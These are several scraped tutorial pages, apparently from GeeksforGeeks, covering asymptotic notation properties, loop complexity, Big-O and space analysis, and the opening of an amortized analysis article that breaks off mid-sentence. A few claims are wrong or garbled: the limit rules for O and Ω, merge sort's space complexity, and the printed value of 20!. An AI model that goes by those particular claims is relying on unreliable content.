Time Complexity AnalysisAnalysis of Algorithms | Big-O analysisAnalysis of different sorting techniquesTail RecursionNP-Completeness | Set 1 (Introduction)Complexity Analysis of Binary SearchAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does 'Space Complexity' mean?Analysis of Algorithms | Set 5 (Practice Problems)Analysis of algorithms | little o and little omega notationsLower and Upper Bound TheoryCyclomatic ComplexityA Time Complexity QuestionMeasure execution time with high precision in C/C++Time complexity of recursive Fibonacci programDifference between Recursion and IterationDifference between NP hard and NP complete problemDifference between Big Oh, Big Omega and Big ThetaIn-Place AlgorithmPseudo-polynomial AlgorithmsTime Complexity Analysis | Tower Of Hanoi (Recursion)Sort elements by frequency | Set 5 (using Java Map) Properties of Asymptotic Notations Last Updated: 06-09-2019 Prerequisite: Asymptotic Notations Assuming f(n), g(n) and h(n) be asymptotic functions the mathematical definitions are: If f(n) = Θ(g(n)), then there exists positive constants c1, c2, n0 such that 0 ≤ c1.g(n) ≤ f(n) ≤ c2.g(n), for all n ≥ n0 If f(n) = O(g(n)), then there exists positive constants c, n0 such that 0 ≤ f(n) ≤ c.g(n), for all n ≥ n0 If f(n) = Ω(g(n)), then there exists positive constants c, n0 such that 0 ≤ c.g(n) ≤ f(n), for all n ≥ n0 If f(n) = o(g(n)), then there exists positive constants c, n0 such that 0 ≤ f(n) < c.g(n), for all n ≥ n0 If f(n) = ω(g(n)), then there exists positive constants c, n0 such that 0 ≤ c.g(n) < f(n), for all n ≥ n0 Properties: Reflexivity: If f(n) is given then f(n) = O(f(n)) Example: If f(n) = n3 ⇒ O(n3) Similarly, f(n) = Ω(f(n)) f(n) = Θ(f(n)) Symmetry: f(n) = Θ(g(n)) if and only if g(n) = Θ(f(n)) Example: If f(n) = n2 and g(n) = n2 then f(n) = Θ(n2) and g(n) = Θ(n2) Proof: Necessary part: f(n) = Θ(g(n)) ⇒ g(n) = Θ(f(n)) By the definition of Θ, there exists positive constants c1, c2, no such that c1.g(n) ≤ f(n) ≤ c2.g(n) for all n ≥ no ⇒ g(n) ≤ (1/c1).f(n) and g(n) ≥ (1/c2).f(n) ⇒ (1/c2).f(n) ≤ g(n) ≤ (1/c1).f(n) Since c1 and c2 are positive constants, 1/c1 and 1/c2 are well defined. Therefore, by the definition of Θ, g(n) = Θ(f(n)) Sufficiency part: g(n) = Θ(f(n)) ⇒ f(n) = Θ(g(n)) By the definition of Θ, there exists positive constants c1, c2, no such that c1.f(n) ≤ g(n) ≤ c2.f(n) for all n ≥ no ⇒ f(n) ≤ (1/c1).g(n) and f(n) ≥ (1/c2).g(n) ⇒ (1/c2).g(n) ≤ f(n) ≤ (1/c1).g(n) By the definition of Theta(Θ), f(n) = Θ(g(n)) Transistivity: f(n) = O(g(n)) and g(n) = O(h(n)) ⇒ f(n) = O(h(n)) Example: If f(n) = n, g(n) = n2 and h(n) = n3 ⇒ n is O(n2) and n2 is O(n3) then n is O(n3) Proof: f(n) = O(g(n)) and g(n) = O(h(n)) ⇒ f(n) = O(h(n)) By the definition of Big-Oh(O), there exists positive constants c, no such that f(n) ≤ c.g(n) for all n ≥ no ⇒ f(n) ≤ c1.g(n) ⇒ g(n) ≤ c2.h(n) ⇒ f(n) ≤ c1.c2h(n) ⇒ f(n) ≤ c.h(n), where, c = c1.c2 By the definition, f(n) = O(h(n)) Similarly, f(n) = Θ(g(n)) and g(n) = Θ(h(n)) ⇒ f(n) = Θ(h(n)) f(n) = Ω(g(n)) and g(n) = Ω(h(n)) ⇒ f(n) = Ω(h(n)) f(n) = o(g(n)) and g(n) = o(h(n)) ⇒ f(n) = o(h(n)) f(n) = ω(g(n)) and g(n) = ω(h(n)) ⇒ f(n) = ω(h(n)) Transpose Symmetry: f(n) = O(g(n)) if and only if g(n) = Ω(f(n)) Example: If f(n) = n and g(n) = n2 then n is O(n2) and n2 is Ω(n) Proof: Necessary part: f(n) = O(g(n)) ⇒ g(n) = Ω(f(n)) By the definition of Big-Oh (O) ⇒ f(n) ≤ c.g(n) for some positive constant c ⇒ g(n) ≥ (1/c).f(n) By the definition of Omega (Ω), g(n) = Ω(f(n)) Sufficiency part: g(n) = Ω(f(n)) ⇒ f(n) = O(g(n)) By the definition of Omega (Ω), for some positive constant c ⇒ g(n) ≥ c.f(n) ⇒ f(n) ≤ (1/c).g(n) By the definition of Big-Oh(O), f(n) = O(g(n)) Similarly, f(n) = o(g(n)) if and only if g(n) = ω(f(n)) Since these properties hold for asymptotic notations, analogies can be drawn between functions f(n) and g(n) and two real numbers a and b. g(n) = O(f(n)) is similar to a ≤ b g(n) = Ω(f(n)) is similar to a ≥ b g(n) = Θ(f(n)) is similar to a = b g(n) = o(f(n)) is similar to a < b g(n) = ω(f(n)) is similar to a > b Observations: max(f(n), g(n)) = Θ(f(n) + g(n)) Proof: Without loss of generality, assume f(n) ≤ g(n), ⇒ max(f(n), g(n)) = g(n) Consider, g(n) ≤ max(f(n), g(n)) ≤ g(n) ⇒ g(n) ≤ max(f(n), g(n)) ≤ f(n) + g(n) ⇒ g(n)/2 + g(n)/2 ≤ max(f(n), g(n)) ≤ f(n) + g(n) From what we assumed, we can write ⇒ f(n)/2 + g(n)/2 ≤ max(f(n), g(n)) ≤ f(n) + g(n) ⇒ (f(n) + g(n))/2 ≤ max(f(n), g(n)) ≤ f(n) + g(n) By the definition of Θ, max(f(n), g(n)) = Θ(f(n) + g(n)) O(f(n)) + O(g(n)) = O(max(f(n), g(n))) Proof: Without loss of generality, assume f(n) ≤ g(n) ⇒ O(f(n)) + O(g(n)) = c1.f(n) + c2.g(n) From what we assumed, we can write O(f(n)) + O(g(n)) ≤ c1.g(n) + c2.g(n) ≤ (c1 + c2) g(n) ≤ c.g(n) ≤ c.max(f(n), g(n)) By the definition of Big-Oh(O), O(f(n)) + O(g(n)) = O(max(f(n), g(n))) Note: If lim n→∞ f(n)/g(n) = c, c ∈ R+ then f(n) = Θ(g(n)) If lim n→∞ f(n)/g(n) ≤ c, c ∈ R (c can be 0) then f(n) = O(g(n)) If lim n→∞ f(n)/g(n) = 0, then f(n) = O(g(n)) and g(n) = O(f(n)) If lim n→∞ f(n)/g(n) ≥ c, c ∈ R (c can be ∞) then f(n) = Ω(g(n)) If lim n→∞ f(n)/g(n) = ∞, then f(n) = Ω(g(n))and g(n) = Ω(f(n)) Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithms | Set 3 (Asymptotic Notations)Asymptotic Analysis and comparison of sorting algorithmsAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of algorithms | little o and little omega notationsACID Properties in DBMSProperties of Boolean AlgebraMathematics | Power Set and its PropertiesProperties of Determinants of MatricesProperties of Relational DecompositionClosure properties of Regular languagesVarious Properties of context free languages (CFL)7 Key Tips to Crack the GATE Exam in First AttemptAdvantage and Disadvantage of RoutersHardware Synchronization Algorithms : Unlock and Lock, Test and Set, Swapranadeepika2409Check out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : AnalysisGATE CS thumb_up 3 To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Regular Graph in Graph Theory Next last_page Minimum given operations required to convert a given binary string to all 1’s Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Proof that SAT is NP CompleteProof that traveling salesman problem is NP HardPractice Set for Recurrence RelationsSet cover is NP Complete Most visited in GATE CS ACID Properties in DBMSLayers of OSI ModelFunctions of Operating SystemPage Replacement Algorithms in Operating SystemsTypes of Operating Systems room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Analysis of Algorithms | Set 4 (Analysis of Loops) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Understanding Time Complexity with Simple ExamplesComplexity of different operations in Binary tree, Binary Search Tree and AVL tree Analysis of Algorithms | Set 4 (Analysis of Loops) Last Updated: 08-05-2019 We have discussed Asymptotic Analysis, Worst, Average and Best Cases and Asymptotic Notations in previous posts. In this post, analysis of iterative programs with simple examples is discussed. 1) O(1): Time complexity of a function (or set of statements) is considered as O(1) if it doesn’t contain loop, recursion and call to any other non-constant time function. // set of non-recursive and non-loop statements For example swap() function has O(1) time complexity. A loop or recursion that runs a constant number of times is also considered as O(1). For example the following loop is O(1). // Here c is a constant for (int i = 1; i <= c; i++) { // some O(1) expressions } 2) O(n): Time Complexity of a loop is considered as O(n) if the loop variables is incremented / decremented by a constant amount. For example following functions have O(n) time complexity. // Here c is a positive integer constant for (int i = 1; i <= n; i += c) { // some O(1) expressions } for (int i = n; i > 0; i -= c) { // some O(1) expressions } 3) O(nc): Time complexity of nested loops is equal to the number of times the innermost statement is executed. For example the following sample loops have O(n2) time complexity for (int i = 1; i <=n; i += c) { for (int j = 1; j <=n; j += c) { // some O(1) expressions } } for (int i = n; i > 0; i -= c) { for (int j = i+1; j <=n; j += c) { // some O(1) expressions } For example Selection sort and Insertion Sort have O(n2) time complexity. 4) O(Logn) Time Complexity of a loop is considered as O(Logn) if the loop variables is divided / multiplied by a constant amount. for (int i = 1; i <=n; i *= c) { // some O(1) expressions } for (int i = n; i > 0; i /= c) { // some O(1) expressions } For example Binary Search(refer iterative implementation) has O(Logn) time complexity. Let us see mathematically how it is O(Log n). The series that we get in first loop is 1, c, c2, c3, … ck. If we put k equals to Logcn, we get cLogcn which is n. 5) O(LogLogn) Time Complexity of a loop is considered as O(LogLogn) if the loop variables is reduced / increased exponentially by a constant amount. // Here c is a constant greater than 1 for (int i = 2; i <=n; i = pow(i, c)) { // some O(1) expressions } //Here fun is sqrt or cuberoot or any other constant root for (int i = n; i > 1; i = fun(i)) { // some O(1) expressions } See this for mathematical details. How to combine time complexities of consecutive loops? When there are consecutive loops, we calculate time complexity as sum of time complexities of individual loops. for (int i = 1; i <=m; i += c) { // some O(1) expressions } for (int i = 1; i <=n; i += c) { // some O(1) expressions } Time complexity of above code is O(m) + O(n) which is O(m+n) If m == n, the time complexity becomes O(2n) which is O(n). How to calculate time complexity when there are many if, else statements inside loops? As discussed here, worst case time complexity is the most useful among best, average and worst. Therefore we need to consider worst case. We evaluate the situation when values in if-else conditions cause maximum number of statements to be executed. For example consider the linear search function where we consider the case when element is present at the end or not present at all. When the code is too complex to consider all if-else cases, we can get an upper bound by ignoring if else and other complex control statements. How to calculate time complexity of recursive functions? Time complexity of a recursive function can be written as a mathematical recurrence relation. To calculate time complexity, we must know how to solve recurrences. We will soon be discussing recurrence solving techniques as a separate post. Quiz on Analysis of Algorithms Next – Analysis of Algorithm | Set 4 (Solving Recurrences) Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Big-O analysisAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)Analysis of Algorithms | Set 5 (Practice Problems)Algorithms Sample Questions | Set 3 | Time Order AnalysisAnalysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Performance of loops (A caching question)Asymptotic Analysis and comparison of sorting algorithmsAnalysis of algorithms | little o and little omega notationsAnalysis of Algorithm | Set 4 (Solving Recurrences)Practice Questions on Time Complexity AnalysisAnalysis of different sorting techniquesTime Complexity Analysis | Tower Of Hanoi (Recursion)Amortized analysis for increment in counterComplexity Analysis of Binary SearchDifference between Posteriori and Priori analysisComplexity analysis of various operations of Binary Min HeapExamples of Big-O analysisAlgorithms | Recurrences | Set 1 Article Tags : AnalysisArticles thumb_up 109 To-do Done 1.5 Based on 216 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Analysis of Algorithms | Set 3 (Asymptotic Notations) Next last_page Analysis of Algorithm | Set 4 (Solving Recurrences) Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Difference between NP hard and NP complete problemPractice Questions on Time Complexity AnalysisComplexity Analysis of Binary SearchCyclomatic Complexity Most visited in Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Tree Traversals (Inorder, Preorder and Postorder)Commonly Asked Data Structure Interview Questions | Set 1SQL | Join (Inner, Left, Right and Full Joins)Practice for cracking any coding interview room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Analysis of Algorithms | Big-O analysis - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Algorithms | Analysis of Algorithms | Question 14Algorithms | Analysis of Algorithms | Question 15Algorithms | Analysis of Algorithms | Question 16Algorithms | Analysis of Algorithms | Question 17Algorithms | Analysis of Algorithms | Question 18Algorithms | Analysis of Algorithms | Question 19Analysis of Algorithms | Big-O analysisAnalysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionAlgorithms | Analysis of Algorithms | Question 13Analysis of Algorithms | Set 1 (Asymptotic Analysis)Time Complexity of building a heapComplexity of different operations in Binary tree, Binary Search Tree and AVL treeUnderstanding Time Complexity with Simple ExamplesPractice Questions on Time Complexity AnalysisAnalysis of different sorting techniquesTail Recursion Analysis of Algorithms | Big-O analysis Last Updated: 08-06-2018 In our previous articles on Analysis of Algorithms, we had discussed asymptotic notations, their worst and best case performance etc. in brief. In this article, we discuss analysis of algorithm using Big – O asymptotic notation in complete details. Big-O Analysis of Algorithms The Big O notation defines an upper bound of an algorithm, it bounds a function only from above. For example, consider the case of Insertion Sort. It takes linear time in best case and quadratic time in worst case. We can safely say that the time complexity of Insertion sort is O(n^2). Note that O(n^2) also covers linear time. The Big-O Asymptotic Notation gives us the Upper Bound Idea, mathematically described below: f(n) = O(g(n)) if there exists a positive integer n0 and a positive constant c, such that f(n)≤c.g(n) ∀ n≥n0 The general step wise procedure for Big-O runtime analysis is as follows: Figure out what the input is and what n represents. Express the maximum number of operations, the algorithm performs in terms of n. Eliminate all excluding the highest order terms. Remove all the constant factors. Some of the useful properties on Big-O notation analysis are as follow: ▪ Constant Multiplication: If f(n) = c.g(n), then O(f(n)) = O(g(n)) ; where c is a nonzero constant. ▪ Polynomial Function: If f(n) = a0 + a1.n + a2.n2 + —- + am.nm, then O(f(n)) = O(nm). ▪ Summation Function: If f(n) = f1(n) + f2(n) + —- + fm(n) and fi(n)≤fi+1(n) ∀ i=1, 2, —-, m, then O(f(n)) = O(max(f1(n), f2(n), —-, fm(n))). ▪ Logarithmic Function: If f(n) = logan and g(n)=logbn, then O(f(n))=O(g(n)) ; all log functions grow in the same manner in terms of Big-O. Basically, this asymptotic notation is used to measure and compare the worst-case scenarios of algorithms theoretically. For any algorithm, the Big-O analysis should be straightforward as long as we correctly identify the operations that are dependent on n, the input size. Runtime Analysis of Algorithms In general cases, we mainly used to measure and compare the worst-case theoretical running time complexities of algorithms for the performance analysis. The fastest possible running time for any algorithm is O(1), commonly referred to as Constant Running Time. In this case, the algorithm always takes the same amount of time to execute, regardless of the input size. This is the ideal runtime for an algorithm, but it’s rarely achievable. In actual cases, the performance (Runtime) of an algorithm depends on n, that is the size of the input or the number of operations is required for each input item. The algorithms can be classified as follows from the best-to-worst performance (Running Time Complexity): ▪ A logarithmic algorithm – O(logn) Runtime grows logarithmically in proportion to n. ▪ A linear algorithm – O(n) Runtime grows directly in proportion to n. ▪ A superlinear algorithm – O(nlogn) Runtime grows in proportion to n. ▪ A polynomial algorithm – O(nc) Runtime grows quicker than previous all based on n. ▪ A exponential algorithm – O(cn) Runtime grows even faster than polynomial algorithm based on n. ▪ A factorial algorithm – O(n!) Runtime grows the fastest and becomes quickly unusable for even small values of n. Where, n is the input size and c is a positive constant. Algorithmic Examples of Runtime Analysis: Some of the examples of all those types of algorithms (in worst-case scenarios) are mentioned below: ▪ Logarithmic algorithm – O(logn) – Binary Search. ▪ Linear algorithm – O(n) – Linear Search. ▪ Superlinear algorithm – O(nlogn) – Heap Sort, Merge Sort. ▪ Polynomial algorithm – O(n^c) – Strassen’s Matrix Multiplication, Bubble Sort, Selection Sort, Insertion Sort, Bucket Sort. ▪ Exponential algorithm – O(c^n) – Tower of Hanoi. ▪ Factorial algorithm – O(n!) – Determinant Expansion by Minors, Brute force Search algorithm for Traveling Salesman Problem. Mathematical Examples of Runtime Analysis: The performances (Runtimes) of different orders of algorithms separate rapidly as n (the input size) gets larger. Let’s consider the mathematical example: If n = 10, If n=20, log(10) = 1; log(20) = 2.996; 10 = 10; 20 = 20; 10log(10)=10; 20log(20)=59.9; 102=100; 202=400; 210=1024; 220=1048576; 10!=3628800; 20!=2.432902e+1818; Memory Footprint Analysis of Algorithms For performance analysis of an algorithm, runtime measurement is not only relevant metric but also we need to consider the memory usage amount of the program. This is referred to as the Memory Footprint of the algorithm, shortly known as Space Complexity. Here also, we need to measure and compare the worst case theoretical space complexities of algorithms for the performance analysis. It basically depends on two major aspects described below: Firstly, the implementation of the program is responsible for memory usage. For example, we can assume that recursive implementation always reserves more memory than the corresponding iterative implementation of a particular problem. And the other one is n, the input size or the amount of storage required for each item. For example, a simple algorithm with a high amount of input size can consume more memory than a complex algorithm with less amount of input size. Algorithmic Examples of Memory Footprint Analysis: The algorithms with examples are classified from the best-to-worst performance (Space Complexity) based on the worst-case scenarios are mentioned below: ▪ Ideal algorithm - O(1) - Linear Search, Binary Search, Bubble Sort, Selection Sort, Insertion Sort, Heap Sort, Shell Sort. ▪ Logarithmic algorithm - O(log n) - Merge Sort. ▪ Linear algorithm - O(n) - Quick Sort. ▪ Sub-linear algorithm - O(n+k) - Radix Sort. Space-Time Tradeoff and Efficiency There is usually a trade-off between optimal memory use and runtime performance. In general for an algorithm, space efficiency and time efficiency reach at two opposite ends and each point in between them has a certain time and space efficiency. So, the more time efficiency you have, the less space efficiency you have and vice versa. For example, Mergesort algorithm is exceedingly fast but requires a lot of space to do the operations. On the other side, Bubble Sort is exceedingly slow but requires the minimum space. At the end of this topic, we can conclude that finding an algorithm that works in less running time and also having less requirement of memory space, can make a huge difference in how well an algorithm performs. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithms | Set 1 (Asymptotic Analysis)Algorithms | Analysis of Algorithms | Question 1Algorithms | Analysis of Algorithms | Question 2Algorithms | Analysis of Algorithms | Question 3Algorithms | Analysis of Algorithms | Question 4Algorithms | Analysis of Algorithms | Question 5Algorithms | Analysis of Algorithms | Question 19Algorithms | Analysis of Algorithms | Question 19Algorithms | Analysis of Algorithms | Question 8Algorithms | Analysis of Algorithms | Question 9Algorithms | Analysis of Algorithms | Question 10Algorithms | Analysis of Algorithms | Question 11Algorithms | Analysis of Algorithms | Question 12Algorithms | Analysis of Algorithms | Question 13Algorithms | Analysis of Algorithms | Question 14Algorithms | Analysis of Algorithms | Question 15Algorithms | Analysis of Algorithms | Question 16Algorithms | Analysis of Algorithms | Question 17Algorithms | Analysis of Algorithms | Question 18SoumyadeepDebnath The Closer You Look The Less You See If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below.Improved By : vitiral Article Tags : AnalysisAlgorithms-Analysis of Algorithms thumb_up 12 To-do Done 3.2 Based on 12 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Time Complexity Analysis | Tower Of Hanoi (Recursion) Next last_page Amortized analysis for increment in counter Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Difference between NP hard and NP complete problemComplexity Analysis of Binary SearchCyclomatic ComplexityAnalysis of Algorithms | Set 5 (Practice Problems) More related articles in Analysis Time complexity of recursive Fibonacci programProof that SAT is NP CompleteProof that traveling salesman problem is NP HardPractice Set for Recurrence RelationsLower and Upper Bound Theory room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Analysis of Algorithm | Set 5 (Amortized Analysis Introduction) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Complexity of different operations in Binary tree, Binary Search Tree and AVL treeUnderstanding Time Complexity with Simple Examples Analysis of Algorithm | Set 5 (Amortized Analysis Introduction) Last Updated: 24-04-2020 Amortized Analysis is used for algorithms where an occasional operation is very slow, but most of the other operations are faster. In Amortized Analysis, we analyze a sequence of operations and guarantee a worst case average time which is lower than the worst case time of a particular expensive operation. The example data structures whose operations are analyzed using Amortized Analysis are Hash Tables, Disjoint Sets and Splay Trees. Let us consider an example of a simple hash table insertions. How do we decide table size? There is a trade-off between space and time, if we make hash-table size big, search time becomes fast, 